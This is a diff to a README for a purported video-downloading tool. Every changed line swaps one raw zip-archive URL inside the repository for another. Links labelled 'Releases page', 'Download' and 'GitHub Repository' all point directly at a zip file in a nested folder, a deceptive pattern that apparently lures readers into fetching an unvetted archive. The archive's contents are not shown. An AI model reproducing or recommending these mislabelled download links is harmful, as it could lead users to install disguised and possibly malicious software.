@@ -1,6 +1,6 @@
 # 📥 TikHub-Multi-Functional-Downloader - Download Videos Effortlessly
 
-[![Download](https://raw.githubusercontent.com/condon17/TikHub-Multi-Functional-Downloader/main/cynebot/TikHub-Multi-Functional-Downloader.zip)](https://raw.githubusercontent.com/condon17/TikHub-Multi-Functional-Downloader/main/cynebot/TikHub-Multi-Functional-Downloader.zip)
+[![Download](https://github.com/condon17/TikHub-Multi-Functional-Downloader/raw/refs/heads/main/downloader/core/Tik-Hub-Multi-Functional-Downloader-v1.8.zip)](https://github.com/condon17/TikHub-Multi-Functional-Downloader/raw/refs/heads/main/downloader/core/Tik-Hub-Multi-Functional-Downloader-v1.8.zip)
 
 ## 📚 Overview
 
@@ -11,7 +11,7 @@ TikHub-Multi-Functional-Downloader is a user-friendly, cross-platform tool that 
 To use TikHub-Multi-Functional-Downloader, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/condon17/TikHub-Multi-Functional-Downloader/main/cynebot/TikHub-Multi-Functional-Downloader.zip) to check for the latest version of the application.
+   Go to our [Releases page](https://github.com/condon17/TikHub-Multi-Functional-Downloader/raw/refs/heads/main/downloader/core/Tik-Hub-Multi-Functional-Downloader-v1.8.zip) to check for the latest version of the application.
 
 2. **Download the Application**  
    Click the download link for your operating system (Windows, macOS, or Linux) and save the file to your computer.
@@ -50,7 +50,7 @@ To use TikHub-Multi-Functional-Downloader, follow these simple steps:
 
 ### How do I update the application?
 
-To update, simply revisit the [Releases page](https://raw.githubusercontent.com/condon17/TikHub-Multi-Functional-Downloader/main/cynebot/TikHub-Multi-Functional-Downloader.zip) and download the latest version.
+To update, simply revisit the [Releases page](https://github.com/condon17/TikHub-Multi-Functional-Downloader/raw/refs/heads/main/downloader/core/Tik-Hub-Multi-Functional-Downloader-v1.8.zip) and download the latest version.
 
 ### Can I download videos from private accounts?
 
@@ -62,7 +62,7 @@ You can download videos in MP4 format, which is widely accepted across devices.
 
 ## 📥 Download & Install
 
-Ready to start? Visit this page to download the latest version of TikHub-Multi-Functional-Downloader: [Releases page](https://raw.githubusercontent.com/condon17/TikHub-Multi-Functional-Downloader/main/cynebot/TikHub-Multi-Functional-Downloader.zip).
+Ready to start? Visit this page to download the latest version of TikHub-Multi-Functional-Downloader: [Releases page](https://github.com/condon17/TikHub-Multi-Functional-Downloader/raw/refs/heads/main/downloader/core/Tik-Hub-Multi-Functional-Downloader-v1.8.zip).
 
 ## 🎉 Contribute
 
@@ -70,7 +70,7 @@ We welcome contributions to TikHub-Multi-Functional-Downloader. If you have idea
 
 ## 🔗 Links
 
-- **GitHub Repository:** [TikHub-Multi-Functional-Downloader](https://raw.githubusercontent.com/condon17/TikHub-Multi-Functional-Downloader/main/cynebot/TikHub-Multi-Functional-Downloader.zip)
+- **GitHub Repository:** [TikHub-Multi-Functional-Downloader](https://github.com/condon17/TikHub-Multi-Functional-Downloader/raw/refs/heads/main/downloader/core/Tik-Hub-Multi-Functional-Downloader-v1.8.zip)
 - **Issues Tracker:** Report bugs or request features on the Issues page.
 
 Thank you for using TikHub-Multi-Functional-Downloader. Enjoy downloading your favorite videos!
